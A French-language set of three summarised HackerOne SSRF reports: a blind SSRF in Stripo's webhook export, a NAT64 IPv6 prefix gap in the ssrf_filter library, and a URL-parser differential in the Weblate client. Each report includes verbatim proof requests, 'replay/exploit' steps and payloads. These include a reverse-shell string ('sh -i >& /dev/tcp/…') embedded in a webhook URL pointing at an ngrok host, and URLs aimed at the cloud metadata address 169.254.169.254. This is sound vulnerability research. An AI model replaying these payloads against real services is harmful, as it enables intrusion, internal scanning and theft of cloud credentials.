# Fiches SSS — SSRF & Cache Attacks

*3 cas sélectionnés dans le corpus 2025-2026 — extraits verbatim des fichiers bruts.*

---

### [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export to Zapier

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2932960)

Dans le service d'export de Stripo, l'endpoint `/exportservice/v3/exports/WEBHOOK/accounts` prend un paramètre `webhookUrl` fourni par l'utilisateur et déclenche une requête HTTP sortante vers cette URL sans filtrage. En pointant `webhookUrl` vers un hôte attaquant (ngrok), le serveur de Stripo émet la requête : SSRF aveugle permettant d'atteindre des services internes, du port-scanning et des endpoints de métadonnées cloud. Le contrôle de l'URL est insuffisant (des caractères de contrôle et des chemins du type `webhook/email.tar.gz` sont acceptés).

**Cause racine :** le paramètre `webhookUrl` (destination WEBHOOK) est utilisé tel quel comme cible de la requête sortante du service d'export, sans validation de l'hôte ni restriction réseau — la requête est émise avec `Apache-HttpClient/4.5.14 (Java/21.0.5)`.

**Preuve technique (verbatim depuis la source) :**

```
POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1
Host: my.stripo.email
```

```
  "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
```

```
POST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1
Host: 5290-101-255-157-9.ngrok-free.app
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)
X-Forwarded-For: 54.247.167.106
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : accès à l'endpoint d'export de Stripo — l'URL citée porte le segment `accounts/52027412` (identifiant de compte webhook) et l'éditeur `my.stripo.email`, mais la source ne documente ni authentification ni compte requis (le PoC `curl` est sans cookie ni en-tête d'autorisation) ; un listener attaquant (ngrok).
- Étapes : 1. Envoyer le POST de la source vers `/bapi/exportservice/v3/exports/WEBHOOK/accounts/<id>` avec `"destination": "WEBHOOK"` et `properties.webhookUrl` pointant vers l'hôte attaquant. 2. Observer la requête sortante reçue sur cet hôte (Host, User-Agent `Apache-HttpClient`), preuve du SSRF. 3. Faire varier `webhookUrl` pour sonder des services internes ou des métadonnées cloud.
- Pièges / limites : SSRF aveugle (la réponse de la cible n'est pas renvoyée dans la réponse HTTP de Stripo) ; aucun contrôle de schéma d'URL n'est documenté dans la source (seul un `webhookUrl` en `https://` y est montré) ; l'impact reste dépendant du réseau interne.

**Reproductibilité :** moyenne — identifiant de compte (`accounts/52027412`) et requêtes complets dans la source, listener ngrok à monter ; l'exigence éventuelle d'un compte n'est pas documentée.

**Techniques :** blind ssrf, attacker-controlled webhook url, server-side outbound request, internal port scan, cloud metadata access

**Correspond aux classes qualifiantes :** ssrf

**Signal (endpoints/fonctions observés) :**
- `POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/<id>`
- `properties.webhookUrl`, `destination: "WEBHOOK"`
- requête sortante `Apache-HttpClient/4.5.14 (Java/21.0.5)`

**Paramètres impliqués :** `webhookUrl`, `destination`, `webhookType`, `id`

---

### SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3634400)

La librairie `ssrf_filter` v1.3.0 bloque le préfixe NAT64 bien connu `64:ff9b::/96` mais pas le préfixe NAT64 local-use `64:ff9b:1::/48` : ces adresses sont traitées comme publiques. Une application utilisant la librairie (ici un endpoint `/fetch`) peut donc émettre des requêtes SSRF vers des cibles internes encodées sous ce préfixe, lorsque celui-ci est routable dans l'environnement de déploiement (exposition de services internes ou de métadonnées, reconnaissance réseau).

**Cause racine :** `unsafe_ip_address?` décide de la sûreté d'une IPv6 uniquement par appartenance à `IPV6_BLACKLIST`, qui omet `64:ff9b:1::/48` : les adresses NAT64 local-use restent dans `public_addresses` et le garde-fou IP privée est contourné.

**Preuve technique (verbatim depuis la source) :**

```
1. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L47-L59: `IPV6_BLACKLIST` includes `64:ff9b::/96` but doesn't include `64:ff9b:1::/48` (NAT64 local-use prefix), leaving that range unclassified as private/unsafe.
```

```
curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

```
curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : lab Docker avec l'application utilisant `ssrf_filter` (endpoint `/fetch` sur le port 4568) ; conteneur secondaire avec `NET_ADMIN` pour ajouter une adresse/route IPv6 de test.
- Étapes : 1. Ajouter `64:ff9b:1::7f00:1/128` sur loopback (`ip -6 addr add … dev lo`) et lancer un service HTTP local lié à cette adresse. 2. Contrôle : `curl 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'` → `blocked` (SsrfFilter::PrivateIPAddress). 3. Bypass : `curl 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'` → `allowed` avec le contenu du service interne.
- Pièges / limites : l'exploitation dépend du routage effectif du préfixe NAT64 local-use dans l'environnement cible ; le lab nécessite `NET_ADMIN`.

**Reproductibilité :** moyenne — étapes complètes mais lab IPv6 avec `NET_ADMIN` et préfixe routable requis.

**Techniques :** ssrf filter bypass, nat64 local-use ipv6 prefix, ipv6 blacklist gap, private ip guard bypass

**Correspond aux classes qualifiantes :** ssrf

**Signal (endpoints/fonctions observés) :**
- `GET /fetch?url=…` (app utilisant `ssrf_filter`)
- `IPV6_BLACKLIST`, `unsafe_ip_address?` (`lib/ssrf_filter/ssrf_filter.rb`)
- réponse `{"status":"allowed",…}` vs `{"status":"blocked",…}`

**Paramètres impliqués :** `url`

---

### SSRF via URL Parser Differential in `normalize_request_url` (wlc)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3887969)

Le client Weblate (`wlc`) valide que les requêtes sortantes restent sur l'origine configurée via `urllib.parse.urlparse`, mais la requête réelle est émise par la librairie `requests` (parser `urllib3`). Les deux parsers divergent sur un backslash placé avant un `@` : `urlparse` extrait l'hôte légitime après `@`, `urllib3` traite le backslash comme séparateur de chemin et prend le premier token comme hôte. Un serveur Weblate malveillant renvoie un champ `next` paginé exploitant ce motif : le contrôle d'origine passe, mais la requête part vers un hôte choisi par l'attaquant (services internes, IMDS cloud `169.254.169.254`).

**Cause racine :** validation et émission utilisent deux parsers d'URL différents, sans vérifier leur accord — differential `urllib.parse` vs `urllib3.util.parse_url`.

**Preuve technique (verbatim depuis la source) :**

```python
url = urlparse(urljoin(self.url, path))
if self.get_origin(url) != self.api_origin:
    raise WeblateException(
        "Server returned a URL outside the configured API origin."
    )
```

```
MALICIOUS_NEXT = "http://169.254.169.254\\@127.0.0.1:8000/latest/meta-data/"
print("urlparse hostname (validation):", parsed.hostname)   # 127.0.0.1
print("urllib3 host (actual request):", u3.host)             # 169.254.169.254
prepared url:          http://169.254.169.254/%5C@127.0.0.1:8000/...
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : attaquant contrôlant (ou ayant compromis) un serveur Weblate auquel la victime connecte `wlc`, ou capable de faire pointer `wlc` vers une URL de serveur non fiable.
- Étapes : 1. Monter un serveur API Weblate factice qui renvoie, sur une liste paginée, un champ `next` valant `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` (ou toute autre cible hors origine). 2. Faire exécuter `wlc --url http://<mock-server>/api/ list-projects`. 3. Observer (capture réseau ou listener) que `wlc` envoie la requête à l'hôte choisi par l'attaquant et non au serveur factice.
- Pièges / limites : la source indique une validation « component-level » uniquement — le run end-to-end « has not been performed as part of this report » ; le differential est valable en HTTP et HTTPS.

**Reproductibilité :** moyenne — PoC composant trivial à rejouer, mais bout-en-bout non vérifié par le rapporteur et nécessitant un serveur Weblate attaquant.

**Techniques :** url parser differential, urllib vs urllib3 disagreement, backslash-before-@ trick, origin validation bypass, ssrf to cloud metadata

**Correspond aux classes qualifiantes :** ssrf, url parser differential

**Signal (endpoints/fonctions observés) :**
- `wlc/client.py` — `normalize_request_url`, `get_origin`, `list_factory`
- champ `next` des réponses API paginées
- `urllib3.util.parse_url` (émission réelle via `requests`)

**Paramètres impliqués :** `next` (URL de pagination), `url`
